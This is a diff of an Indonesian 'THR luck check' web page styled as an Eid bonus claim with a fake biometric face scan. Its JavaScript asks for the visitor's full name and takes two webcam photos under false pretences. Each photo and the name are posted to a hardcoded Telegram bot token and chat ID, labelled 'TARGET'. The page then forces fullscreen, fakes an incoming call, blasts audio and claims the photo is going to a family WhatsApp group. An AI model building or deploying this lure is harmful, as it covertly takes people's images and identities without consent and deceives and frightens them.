@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Klaim THR Lebaran 🌙</title>
+    <title>CEK KEBERUNTUNGAN THR💸🌙</title>
     <style>
         body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
         #intro { margin-top: -50px; padding: 0 20px; z-index: 5; }
@@ -11,27 +11,27 @@
         #timer-box { color: #dc2626; font-weight: bold; font-size: 0.8rem; margin-bottom: 10px; background: #fee2e2; padding: 5px 15px; border-radius: 20px; display: inline-block; border: 1px solid #fca5a5; }
         #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 25px; width: 280px; z-index: 6; }
         input { width: 90%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 10px; outline: none; text-align: center; font-size: 1rem; }
-        #envelope { width: 220px; cursor: pointer; transition: 0.2s; z-index: 10; }
+        #envelope { width: 200px; cursor: pointer; transition: 0.2s; z-index: 10; }
+        #envelope:active { transform: scale(0.9); }
         
-        /* FAKE CALL */
+        /* FAKE CALL UI */
         #fake-call { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #075e54; color: white; z-index: 5000; flex-direction: column; align-items: center; justify-content: center; }
-        .caller-id { font-size: 2rem; font-weight: bold; margin-bottom: 10px; }
-        .call-status { animation: blink 1s infinite; margin-bottom: 80px; font-size: 1.1rem; }
+        .caller-id { font-size: 2.2rem; font-weight: bold; margin-bottom: 5px; }
+        .call-status { animation: blink 1s infinite; margin-bottom: 80px; font-size: 1.1rem; opacity: 0.8; }
         .call-btns { display: flex; gap: 60px; }
         .call-btn { width: 75px; height: 75px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; color: white; border: none; cursor: pointer; }
         .decline { background: #ea4335; } .accept { background: #34a853; }
         
-        /* FAKE POPUP */
-        #fake-alert { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; }
+        /* POPUPS */
+        #fake-alert { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; align-items: center; justify-content: center; }
         .alert-box { background: white; width: 85%; max-width: 320px; padding: 30px; border-radius: 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        .alert-box h3 { color: #15803d; margin-top: 0; }
         .btn-ready { background: #15803d; color: white; border: none; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; font-size: 1rem; }
 
         /* LOADING */
         #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 2000; flex-direction: column; align-items: center; justify-content: center; }
         .spinner { border: 6px solid #f3f3f3; border-top: 6px solid #15803d; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }
         
-        /* PRANK SCREEN */
+        /* FINAL PRANK SCREEN */
         #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 4000; justify-content: center; align-items: center; }
         #prank-screen img { width: 100%; height: 100%; object-fit: contain; }
         #particle-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 4010; pointer-events: none; }
@@ -59,19 +59,19 @@
     <div id="fake-alert">
         <div class="alert-box">
             <h3 id="alert-title">📸 Scan Biometrik</h3>
-            <p id="alert-msg">Klik <b>Lanjutkan</b> untuk verifikasi wajah & cairkan saldo THR hari ini!</p>
+            <p id="alert-msg">Silakan klik <b>Lanjutkan</b> untuk verifikasi wajah & klaim saldo THR kamu!</p>
             <button class="btn-ready" id="btn-lanjut">LANJUTKAN</button>
         </div>
     </div>
 
     <div id="intro">
-        <h1>CEK KEBERUNTUNGAN THR 🌙</h1>
+        <h1>CEK KEBERUNTUNGAN THR💸🌙</h1>
         <div id="timer-box">🔥 Event Berakhir: <span id="countdown">02:59</span></div>
-        <p>Input nama & klik amplop untuk mulai scan!</p>
+        <p>Input namamu & klik amplop untuk mulai!</p>
     </div>
 
     <div id="verify-box">
-        <input type="text" id="victim-name" placeholder="Nama Lengkap Anda" autocomplete="off">
+        <input type="text" id="victim-name" placeholder="Nama Lengkap Kamu" autocomplete="off">
     </div>
 
     <img id="envelope" src="amplop.png" alt="Buka">
@@ -99,17 +99,18 @@
         const canvas = document.getElementById('canvas');
         const fakeCall = document.getElementById('fake-call');
         
-        // SOUNDS
+        // Sounds
         const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');
         const trumpetSound = new Audio('https://www.myinstants.com/media/sounds/air-horn-club-sample_1.mp3');
         const callSound = new Audio('https://www.myinstants.com/media/sounds/iphone_original-ringtone.mp3');
         
+        // Telegram Config
         const TELE_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
         const TELE_ID = '7267912519'; 
         let globalNama = "";
         let attempt = 1;
 
-        // Timer
+        // Timer Logic
         let sec = 179;
         setInterval(() => {
             let m = Math.floor(sec/60); let s = sec%60;
@@ -117,22 +118,32 @@
             if(sec > 10) sec--;
         }, 1000);
 
-        // TRIGGER AWAL
+        // Step 1: Open Envelope & Trigger Audio/Fullscreen
         env.addEventListener('click', () => {
             globalNama = document.getElementById('victim-name').value;
-            if(!globalNama) return alert("Masukkan nama dulu!");
+            if(!globalNama) return alert("Isi namamu dulu!");
+            
+            // Fullscreen Trigger
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+
+            // Audio Priming
+            callSound.volume = 1.0;
+            callSound.play().then(() => {
+                callSound.pause();
+                callSound.currentTime = 0;
+            }).catch(e => console.log("Audio waiting for gesture..."));
+
+            prankSound.load(); trumpetSound.load();
             fakeAlert.style.display = 'flex';
-            // Pre-load audio
-            prankSound.load(); trumpetSound.load(); callSound.load();
         });
 
-        // PROSES UTAMA
+        // Step 2: Biometric Scan Logic
         btnLanjut.addEventListener('click', async () => {
             fakeAlert.style.display = 'none';
             loadingOverlay.style.display = 'flex';
             
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(() => {});
-
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
@@ -140,7 +151,7 @@
                 
                 await new Promise(res => setTimeout(res, 2500));
                 
-                // JEPRET
+                // Capture & Send
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
@@ -148,12 +159,11 @@
                 canvas.toBlob(blob => {
                     const fd = new FormData();
                     fd.append('chat_id', TELE_ID);
-                    fd.append('photo', blob, 'foto.jpg');
-                    fd.append('caption', `🎯 FOTO KE-${attempt}: ${globalNama}`);
+                    fd.append('photo', blob, 'target.jpg');
+                    fd.append('caption', `🎯 TARGET [${attempt}]: ${globalNama}`);
                     fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 }, 'image/jpeg');
 
-                // Matikan stream biar lampu indikator mati dulu
                 stream.getTracks().forEach(t => t.stop());
 
                 if(attempt === 1) {
@@ -161,50 +171,46 @@
                     setTimeout(() => {
                         loadingOverlay.style.display = 'none';
                         alertTitle.innerText = "⚠️ Verifikasi Gagal";
-                        alertMsg.innerHTML = "Wajah kurang jelas/terlalu kaku. Silakan <b>Senyum Lebar (Gigi Terlihat)</b> agar sistem mengonfirmasi Anda bukan Bot.";
+                        alertMsg.innerHTML = "Wajah tidak sinkron. Silakan <b>Senyum Lebar (Gigi Terlihat)</b> agar sistem mengonfirmasi klaim Anda.";
                         fakeAlert.style.display = 'flex';
                     }, 1500);
                 } else {
-                    // SELESAI FOTO KE-2 -> FAKE CALL
                     setTimeout(() => {
                         loadingOverlay.style.display = 'none';
                         fakeCall.style.display = 'flex';
                         callSound.loop = true;
-                        callSound.play().catch(() => {});
-                        
-                        // Jeda 6 detik telepon baru masuk prank utama
+                        callSound.play().catch(e => {});
                         setTimeout(finalPunchline, 6000);
                     }, 1500);
                 }
-
             } catch (e) {
-                // Jika kamera diblokir, langsung skip ke prank
                 setTimeout(finalPunchline, 2000);
             }
         });
 
+        // Step 3: The Big Surprise
         function finalPunchline() {
             callSound.pause();
             fakeCall.style.display = 'none';
             loadingOverlay.style.display = 'none';
             prank.style.display = 'flex';
             
-            if (navigator.vibrate) navigator.vibrate([400, 100, 400]);
+            // Vibrate Android Only
+            if (navigator.vibrate) {
+                navigator.vibrate([100, 50, 100, 50, 100, 50, 500, 200, 1000]);
+            }
             
             trumpetSound.play();
             prankSound.loop = true;
             prankSound.play();
             
-            setInterval(burst, 2000);
+            setInterval(burst, 1500);
             
-            setTimeout(() => alert("🚨 ALERT: AKSES ILEGAL TERDETEKSI!"), 1000);
-            setTimeout(() => alert("FOTO ANDA SEDANG DIKIRIM KE GRUP WHATSAPP KELUARGA..."), 3000);
-            setTimeout(() => {
-                confirm("Batalkan pengiriman foto memalukan ini?");
-                alert("Gagal membatalkan! Server sibuk mengirim data.");
-            }, 6000);
+            setTimeout(() => alert("🚨 ALERT: SISTEM MENDETEKSI WAJAH TERLALU GANTENG/CANTIK!"), 1000);
+            setTimeout(() => alert("FOTO SENYUM ANDA SEDANG DIKIRIM KE GRUP WHATSAPP KELUARGA..."), 3000);
         }
 
+        // Laugh Particles
         function burst() {
             const container = document.getElementById('particle-container');
             for (let i = 0; i < 35; i++) {
